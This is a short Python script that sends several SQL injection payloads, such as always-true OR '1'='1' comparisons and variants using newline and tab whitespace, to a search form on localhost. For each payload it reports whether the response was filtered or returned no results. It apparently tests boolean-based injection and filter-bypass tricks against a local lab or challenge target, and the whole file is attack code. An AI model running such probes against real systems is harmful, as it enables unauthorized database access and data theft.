import urllib.parse, urllib.request

def send(p):
    data = urllib.parse.urlencode({'username': p}).encode()
    with urllib.request.urlopen('http://localhost:8080/search.php', data=data, timeout=10) as r:
        return r.read().decode('utf-8','ignore')

for p in ["a'OR'1'='1", "a'OR'1'='2", "'OR'1'='1", "'OR'1'='2", "a'OR\n'1'='1", "a'OR\t'1'='1"]:
    body = send(p)
    print(repr(p), '->', ('FILTERED' if 'filtered' in body else 'OK'), 'NORES' if 'No results' in body else '')
